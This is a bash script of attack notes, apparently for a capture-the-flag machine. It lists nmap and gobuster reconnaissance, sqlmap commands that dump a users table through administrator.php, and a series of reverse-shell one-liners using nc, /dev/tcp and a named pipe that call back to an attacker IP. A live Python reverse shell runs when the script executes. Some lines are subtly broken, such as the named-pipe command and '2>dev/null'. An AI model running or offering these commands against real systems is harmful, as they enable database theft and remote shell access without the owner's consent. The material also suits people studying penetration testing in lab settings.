#!/bin/bash

IP=10.10.157.193
#sudo nmap -sC -sS $IP
#sudo nmap -sV -p80,22 $IP


#sudo gobuster dir -u http://$IP -w big.txt -x php,sh,txt,cgi,js,css,html,py
#sudo gobuster dir -u http://$IP -w big.txt -x php,txt,html
### => found administrator.php

#sudo sqlmap -u http://$IP/administrator.php --form -a
#sudo sqlmap -u http://$IP/administrator.php --data 'username=&password=' -a

#sudo sqlmap -u http://$IP/administrator.php --data 'username=&password=' --dbs
#sudo sqlmap -u http://$IP/administrator.php --data 'username=&password=' -D users --tables

#sudo sqlmap -u http://$IP/administrator.php --data 'username=&password=' -D users -T users --dump

#nc -lnvp 4444
#nc 10.9.1.13 4444 –e /bin/bash
#bash -i >& /dev/tcp/10.9.1.13/4444 0>&1
#sh | nc 10.9.1.13 4444
#nc -e /bin/sh 10.9.1.13 4444
#rm -f /tmp/p; mknod /tmp/p p && nc 10.9.1.13 12345 0/tmp/p
#https://highon.coffee/blog/reverse-shell-cheat-sheet/
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.13",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


find / -user www-data 2>dev/null